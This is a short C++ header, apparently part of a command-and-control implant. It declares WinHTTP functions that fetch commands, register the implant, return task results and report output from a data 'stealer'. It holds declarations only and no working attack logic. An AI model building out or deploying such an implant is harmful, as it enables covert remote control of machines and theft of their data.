#ifndef HTTP_H
#define HTTP_H

/* Standard Header Files */
#include <windows.h>
#include <winhttp.h>
#include <string>
#include <iostream>
#include <stdio.h>

#include "symkey.h"
#include "../nlohmann/json.hpp"

using json = nlohmann::json;

char * GlobalKey = NULL;

/* Functions */
std::string HttpGetCommand(std::string, int);
std::string HttpRegisterImplant(std::string, std::string, std::string);
std::string HttpResponse(std::string , int , int , std::string , std::string , std::string );
std::string StealerHttpResponse(std::string uri, int implant_id, int task_id, json results, std::string success, std::string command);

#endif